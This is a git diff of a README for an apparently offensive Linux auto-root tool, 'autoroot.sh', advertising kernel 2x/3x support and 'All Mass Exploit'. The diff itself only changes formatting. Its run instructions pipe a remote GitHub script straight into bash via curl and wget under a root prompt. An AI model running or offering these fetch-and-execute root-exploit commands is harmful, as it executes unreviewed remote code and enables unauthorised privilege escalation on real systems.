@@ -13,6 +13,7 @@
 <div align="center"><h1>Support & Features</h1></div>
 
 <samp>
+  
 * Kernel 2x
   
 * Kernel 3x
@@ -26,6 +27,7 @@
 * All Mass Exploit
 
 </samp>
+
 <div align="center"><h1>How To Run ?</h1></div>
 
 
@@ -38,9 +40,8 @@ root@HaxorSec:~# bash -c "$(curl -fsSL https://raw.githubusercontent.com/HaxorSe
 <div align="center"><h1>Wget</h1></div>
 
 ```
-
 root@HaxorSec:~# bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/HaxorSecInfec/autoroot.sh/main/autoroot.sh)"
-``
+```
 
 <div align="center"><h1>Read this</h1></div>
 
